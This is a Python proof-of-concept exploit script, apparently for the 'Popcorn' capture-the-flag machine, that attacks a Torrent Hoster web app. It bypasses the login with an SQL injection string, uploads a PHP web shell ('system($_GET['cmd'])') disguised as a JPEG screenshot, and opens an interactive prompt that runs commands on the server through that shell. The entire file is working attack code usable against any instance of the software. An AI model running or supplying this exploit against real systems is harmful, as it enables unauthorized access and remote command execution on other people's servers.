import requests
import sys
from cmd import Cmd

def main():  
    import requests
    import sys
    from cmd import Cmd

    Ip = sys.argv[1]
    s = requests.Session()
    print("[*] Login to torrent hoster!")
    Url = "http://" + Ip + "/torrent/login.php"
    data = {"username": "' or 1=1 -- - ", "password": "a"}
    x = s.post(Url, data)
    if "Username" in x.text:
        print("Login failed!")
    else:
        print("Login success!")

    print("[*] Upload shell to torrent hoster!")
    sessid = s.cookies['PHPSESSID']
    # print(sessid)
    import requests

    url = "http://" + Ip + "/torrent/upload_file.php?mode=upload&id=723bc28f9b6f924cca68ccdff96b6190566ca6b4"
    cookies = {"/torrent/": "", "/torrent/login.php": "", "/torrent/index.php": "", "/torrent/torrents.phpfirsttimeload": "0", "saveit_0": "0", "saveit_1": "", "/torrent/torrents.php": "", "PHPSESSID": sessid}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------151596181837137412274124427650", "Origin": "http://10.10.10.6", "Connection": "close", "Referer": "http://10.10.10.6/torrent/edit.php?mode=edit&id=723bc28f9b6f924cca68ccdff96b6190566ca6b4", "Upgrade-Insecure-Requests": "1"}
    data = "-----------------------------151596181837137412274124427650\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?\r\nsystem($_GET['cmd']);\r\n?>\r\n-----------------------------151596181837137412274124427650\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nSubmit Screenshot\r\n-----------------------------151596181837137412274124427650--\r\n"
    requests.post(url, headers=headers, cookies=cookies, data=data)
    print("[+] Upload shell successfull")
    print('[*] Waiting for shell:')
    class Term(Cmd):

        prompt = "Popcorn > "

        def default(self, args):
            resp = requests.get("http://"+ Ip +'/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php',
                params = {"cmd": args})
            print(resp.text)
            if args ==  "exit":
                exit()     
    term = Term()
    term.cmdloop()

if __name__ == '__main__':
	if len(sys.argv) < 2:
	    print("[*] Usage  : python3 POC.py <Target ip> ")
	    exit()  
	else:
		main()
